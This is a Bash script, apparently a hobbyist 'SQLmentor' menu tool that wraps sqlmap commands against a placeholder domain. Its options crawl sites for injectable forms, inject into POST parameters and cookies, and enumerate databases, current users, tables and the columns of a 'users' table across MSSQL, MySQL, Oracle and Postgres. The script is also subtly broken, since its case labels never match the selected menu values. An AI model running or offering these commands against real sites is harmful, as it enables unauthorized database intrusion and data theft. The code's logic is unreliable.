#!/bin/bash
tput bold
clear
main() {
echo -ne "
Credit For SQLmap Goes To Its Developers, Not Me. I Just Created The Cheet Sheat
  ██████   █████   ██▓     ███▄ ▄███▓▓█████  ███▄    █ ▄▄▄█████▓ ▒█████   ██▀███  
▒██    ▒ ▒██▓  ██▒▓██▒    ▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
░ ▓██▄   ▒██▒  ██░▒██░    ▓██    ▓██░▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
  ▒   ██▒░██  █▀ ░▒██░    ▒██    ▒██ ▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
▒██████▒▒░▒███▒█▄ ░██████▒▒██▒   ░██▒░▒████▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒ @psycolulz
▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░░  ░      ░ ░ ░  ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░   ░▒ ░ ▒░  V. 1.0.3
░  ░  ░     ░   ░   ░ ░   ░      ░      ░      ░   ░ ░   ░      ░ ░ ░ ▒    ░░   ░ 
      ░      ░        ░  ░       ░      ░  ░         ░              ░ ░     ░     
                                                                                 
 "https://github.com/psycolulz"
 This Tool Is For Educational Purposes! Shoutout To The SQLmap Developers "
PS3='root@sqlmentor~:'
options=("SQL Crawling" "SQL Crawling + Forms" "SQL GET Req." "SQL POST Req." "SQL Auth Site" "Collect DB & User" "Sql & Tables" "SQL User Columns" "SQL mssql DB" "SQL mysql DB" "SQL oracle DB" "SQL postgres DB" "Update Tool")
select opt in "${options[@]}"
do 
case $opt in 
"1) SQL Crawling")
# Do Not Forget To Replace The Default Domains
command clear
command sqlmap -u https://enterdomainhere.com/ --crawl=2
;;
"2) SQL Crawling + Forms")
command clear
command sqlmap -u https://enterdomainhere.com/ --forms --crawl=2
;;
"3) SQL GET Req.")
command clear
command sqlmap -u https://enterdomainhere.com/
;;
"4) SQL POST Req.")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val"
;;
"5) SQL Auth Site")
command clear
command  sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --cookie="cookie1=val1;cookie2=val2"
;;
"6) Collect DB & User")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --current-db --current-user
;;
"7) SQL & Tables")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --tables -D "testdb"
;;
"8) SQL User Columns")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --columns -T "users"
;;
"9) SQL mssql DB")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mssql"
;;
"10) SQL mysql DB")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mysql"
;;
"11) SQL oracle DB")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="oracle"
;;
"12) SQL postgres DB")
command clear
command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="postgres"
;;
"13) Update Tool")
command clear
command git pull
command clear
echo
echo
echo " Tool Has Been Updated Successfully!!! "
echo
echo " ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣷⣶⣴⣾⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣤⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣄⠀⠀⠀⠀
⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀
⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠈⢻⣿⣿⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⡿⠻⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿
⢈⣿⣿⣿⣿⣿⣿⣯⡀⠀⠈⠻⣿⣿⣿⠟⠁⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠈⠛⠁⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀
⠀⠀⠀⠀⠉⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠛⠉⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⠿⢿⡻⠿⣿⣿⣿⠟⠁⠀⠀⠀
"⠀
;;
esac
echo "Press Ctrl + C"
done
}
main


